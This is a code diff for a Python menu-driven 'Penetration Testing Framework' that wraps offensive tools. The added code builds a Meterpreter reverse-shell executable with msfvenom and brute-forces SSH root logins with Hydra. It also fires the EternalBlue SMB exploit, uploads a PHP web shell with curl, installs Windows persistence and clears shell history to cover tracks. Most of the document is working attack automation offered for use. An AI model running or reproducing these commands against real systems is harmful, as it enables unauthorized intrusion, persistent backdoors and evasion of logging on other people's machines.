@@ -13,13 +13,11 @@
 
 import subprocess
 import sys
-import os
 import shutil
-from pathlib import Path
-from colorama import Fore, Style
 from datetime import datetime
+from colorama import Fore, Style
 
-# Helper Function to write output to a report with better formatting
+# Helper Function to write output to a report
 def write_to_report(content, section="General"):
     timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
     report_path = "penetration_test_report.txt"
@@ -32,45 +30,11 @@ def write_to_report(content, section="General"):
 # Splash Screen
 def display_splash_screen():
     splash = """
-    
-_____________________  ___________                                                  __                  _____  ______________  ___ ___    _____           _______  ____ 
-\______   \__    ___/  \_   _____/____________     _____   ______  _  _____________|  | __             /  |  |/_   \______   \/   |   \  /  |  |          \   _  \/_   |
- |     ___/ |    |      |    __)  \_  __ \__  \   /     \_/ __ \ \/ \/ /  _ \_  __ \  |/ /   ______   /   |  |_|   ||     ___/    ~    \/   |  |_  ______ /  /_\  \|   |
- |    |     |    |      |     \    |  | \// __ \_|  Y Y  \  ___/\     (  <_> )  | \/    <   /_____/  /    ^   /|   ||    |   \    Y    /    ^   / /_____/ \  \_/   \   |
- |____|     |____|______\___  /    |__|  (____  /|__|_|  /\___  >\/\_/ \____/|__|  |__|_ \           \____   | |___||____|    \___|_ /\____   |           \_____  /___|
-                 /_____/    \/                \/       \/     \/                        \/                |__|                      \/      |__|                 \/     
-
-                                                     _:_
-                                                    '-.-'
-                                           ()      __.'.__
-                                        .-:--:-.  |_______|
-                                 ()      \____/    \=====/
-                                 /\      {====}     )___(
-                      (\=,      //\\      )__(     /_____\
-      __    |'-'-'|  //  .\    (    )    /____\     |   |
-     /  \   |_____| (( \_  \    )__(      |  |      |   |
-     \__/    |===|   ))  `\_)  /____\     |  |      |   |
-    /____\   |   |  (/     \    |  |      |  |      |   |
-     |  |    |   |   | _.-'|    |  |      |  |      |   |
-     |__|    )___(    )___(    /____\    /____\    /_____\
-    (====)  (=====)  (=====)  (======)  (======)  (=======)
-   (______)(_______)(_______)(________)(________)(_________)
-   
-    
+    _____ Penetration Testing Framework _____
     """
     print(f"{Fore.CYAN}{splash}{Style.RESET_ALL}")
 
-# Columnar Display Helper Function
-def display_in_columns(options, column_count=2):
-    max_length = max(len(option) for option in options)
-    formatted_options = [
-        f"[{index+1}] {option:<{max_length}}" 
-        for index, option in enumerate(options)
-    ]
-    for i in range(0, len(formatted_options), column_count):
-        print("    ".join(formatted_options[i:i + column_count]))
-
-# Check Tool Installation
+# Check if tool is installed
 def check_tool(tool_name):
     return shutil.which(tool_name) is not None
 
@@ -80,74 +44,31 @@ def install_tool(tool_name):
     else:
         print(f"{Fore.RED}Automatic installation not supported on this OS.{Style.RESET_ALL}")
 
-def check_and_install_tools(tools):
-    for tool in tools:
-        if not check_tool(tool):
-            print(f"{Fore.RED}{tool} is not installed.{Style.RESET_ALL}")
-            choice = input(f"Do you want to install {tool}? (y/n): ").lower()
-            if choice == "y":
-                install_tool(tool)
+# Tool runner and output capture
+def run_tool(command, section="General"):
+    try:
+        result = subprocess.run(command, capture_output=True, text=True, check=True)
+        print(f"{Fore.GREEN}{result.stdout}{Style.RESET_ALL}")
+        write_to_report(result.stdout, section)
+    except subprocess.CalledProcessError as e:
+        print(f"{Fore.RED}Error executing {command}: {e.stderr}{Style.RESET_ALL}")
+        write_to_report(f"Error executing {command}: {e.stderr}", section)
 
-# Methodology Layout
-def display_methodology():
-    methodology = """
-    Penetration Testing Methodology:
-
-    1. Reconnaissance (Information Gathering)
-        - Network Discovery
-        - OS Fingerprinting
-        - Service Enumeration
-
-    2. Scanning & Enumeration
-        - Vulnerability Scanning
-        - Enumeration of SMB, DNS, HTTP, etc.
-        - Port Scanning with Nmap
-
-    3. Exploitation
-        - Web Application Exploits
-        - Network Exploits
-        - Social Engineering Attacks
-
-    4. Gaining Access
-        - Brute Force Attacks (SSH, HTTP, SMB, etc.)
-        - Remote Exploits
-        - Web Shells
-
-    5. Maintaining Access
-        - Creating Backdoors
-        - Installing Persistent Agents
-        - Privilege Escalation
-
-    6. Covering Tracks
-        - Log Clearing
-        - History Deletion
-        - Traffic Spoofing
-
-    7. Reporting & Results
-        - Documenting Findings
-        - Recommendations
-        - Executive Summary
-
-    """
-    print(f"{Fore.CYAN}{methodology}{Style.RESET_ALL}")
-
-# Reconnaissance Tools
+# Reconnaissance Tools (Example: Nmap)
 def run_reconnaissance_tools():
     print(f"{Fore.CYAN}Running Reconnaissance Tools...{Style.RESET_ALL}")
-    # Nmap Scan Example
     target = input(f"{Fore.YELLOW}Enter target IP for Nmap scan: {Style.RESET_ALL}")
-    subprocess.run(["nmap", "-sV", target], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    write_to_report(f"Nmap scan on {target} completed.", section="Reconnaissance")
+    nmap_command = ["nmap", "-sV", target]
+    run_tool(nmap_command, section="Reconnaissance")
 
-# Scanning & Enumeration Tools
+# Scanning & Enumeration Tools (Example: Nikto)
 def run_scanning_tools():
     print(f"{Fore.CYAN}Running Scanning & Enumeration Tools...{Style.RESET_ALL}")
-    # Nikto web scan example
     target = input(f"{Fore.YELLOW}Enter target URL for Nikto scan: {Style.RESET_ALL}")
-    subprocess.run(["nikto", "-h", target], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-    write_to_report(f"Nikto scan on {target} completed.", section="Scanning & Enumeration")
+    nikto_command = ["nikto", "-h", target]
+    run_tool(nikto_command, section="Scanning & Enumeration")
 
-# Gaining Access Tools
+# Gaining Access Tools (Example: Hydra, MSFVenom)
 def gaining_access_menu():
     print(f"\n{Fore.CYAN}Gaining Access:{Style.RESET_ALL}")
     options = [
@@ -157,29 +78,31 @@ def gaining_access_menu():
         "Web Shell Upload",
         "Return to Main Menu"
     ]
-    display_in_columns(options, column_count=2)
+    for i, option in enumerate(options, 1):
+        print(f"[{i}] {option}")
 
     try:
         choice = int(input(f"\n{Fore.YELLOW}Enter your choice: {Style.RESET_ALL}"))
         if choice == 1:
             print(f"{Fore.YELLOW}Launching MSFVenom...{Style.RESET_ALL}")
-            subprocess.run(["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=192.168.1.1", "LPORT=4444", "-f", "exe", "-o", "payload.exe"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            write_to_report("MSFVenom payload created.", section="Gaining Access")
+            msfvenom_command = ["msfvenom", "-p", "windows/meterpreter/reverse_tcp", "LHOST=192.168.1.1", "LPORT=4444", "-f", "exe", "-o", "payload.exe"]
+            run_tool(msfvenom_command, section="Gaining Access")
         elif choice == 2:
             print(f"{Fore.YELLOW}Launching Hydra for brute force...{Style.RESET_ALL}")
             target = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}")
-            subprocess.run(["hydra", "-l", "root", "-P", "/usr/share/wordlists/rockyou.txt", f"ssh://{target}"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            write_to_report(f"Brute force attempt on {target} with Hydra completed.", section="Gaining Access")
+            hydra_command = ["hydra", "-l", "root", "-P", "/usr/share/wordlists/rockyou.txt", f"ssh://{target}"]
+            run_tool(hydra_command, section="Gaining Access")
         elif choice == 3:
             print(f"{Fore.YELLOW}Exploiting SMB with EternalBlue...{Style.RESET_ALL}")
             target = input(f"{Fore.YELLOW}Enter target IP: {Style.RESET_ALL}")
-            subprocess.run(["msfconsole", "-x", f"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
-            write_to_report(f"EternalBlue exploit on {target} completed.", section="Gaining Access")
+            eternalblue_command = ["msfconsole", "-x", f"use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS {target}; run"]
+            run_tool(eternalblue_command, section="Gaining Access")
         elif choice == 4:
             print(f"{Fore.YELLOW}Web Shell Upload...{Style.RESET_ALL}")
             target = input(f"{Fore.YELLOW}Enter target URL: {Style.RESET_ALL}")
-            # You can use custom scripts for web shell upload, example below
-            write_to_report(f"Web shell upload attempt on {target} completed.", section="Gaining Access")
+            # Example of web shell upload process
+            web_shell_command = ["curl", "-X", "POST", f"{target}/upload", "-F", "file=@webshell.php"]
+            run_tool(web_shell_command, section="Gaining Access")
         elif choice == 5:
             main_menu()
         else:
@@ -189,7 +112,25 @@ def gaining_access_menu():
         print(f"{Fore.RED}Invalid input. Please enter a number.{Style.RESET_ALL}")
         gaining_access_menu()
 
-# Main Menu (Expanded)
+# Proxy Setup (Example: Tor)
+def setup_proxies():
+    print(f"{Fore.YELLOW}Setting up Tor proxy...{Style.RESET_ALL}")
+    tor_command = ["tor"]
+    run_tool(tor_command, section="Setup Proxies")
+
+# Maintaining Access (Example: persistence script)
+def maintain_access():
+    print(f"{Fore.YELLOW}Setting up persistence...{Style.RESET_ALL}")
+    persistence_command = ["msfconsole", "-x", "use post/windows/manage/persistence; set SESSION 1; run"]
+    run_tool(persistence_command, section="Maintaining Access")
+
+# Covering Tracks (Example: clearing logs)
+def cover_tracks():
+    print(f"{Fore.YELLOW}Covering tracks...{Style.RESET_ALL}")
+    log_clear_command = ["bash", "-c", "history -c && clear"]
+    run_tool(log_clear_command, section="Covering Tracks")
+
+# Main Menu
 def main_menu():
     display_splash_screen()
     print(f"{Fore.CYAN}Welcome to the Penetration Testing Framework!{Style.RESET_ALL}")
@@ -202,7 +143,8 @@ def main_menu():
         "Covering Tracks",
         "Exit"
     ]
-    display_in_columns(options, column_count=2)
+    for i, option in enumerate(options, 1):
+        print(f"[{i}] {option}")
 
     try:
         choice = int(input(f"\n{Fore.YELLOW}Select an option: {Style.RESET_ALL}"))
@@ -216,19 +158,13 @@ def main_menu():
             gaining_access_menu()
             main_menu()
         elif choice == 4:
-            print(f"{Fore.YELLOW}Setting up proxies...{Style.RESET_ALL}")
-            # Implement Proxy setup (e.g., Tor/Proxychains)
-            write_to_report("Proxies setup completed.", section="Setup Proxies")
+            setup_proxies()
             main_menu()
         elif choice == 5:
-            print(f"{Fore.YELLOW}Maintaining access...{Style.RESET_ALL}")
-            # Implement maintaining access (e.g., persistence)
-            write_to_report("Maintaining access completed.", section="Maintaining Access")
+            maintain_access()
             main_menu()
         elif choice == 6:
-            print(f"{Fore.YELLOW}Covering tracks...{Style.RESET_ALL}")
-            # Implement covering tracks (e.g., log clearing)
-            write_to_report("Covering tracks completed.", section="Covering Tracks")
+            cover_tracks()
             main_menu()
         elif choice == 7:
             print(f"{Fore.RED}Exiting the script.{Style.RESET_ALL}")
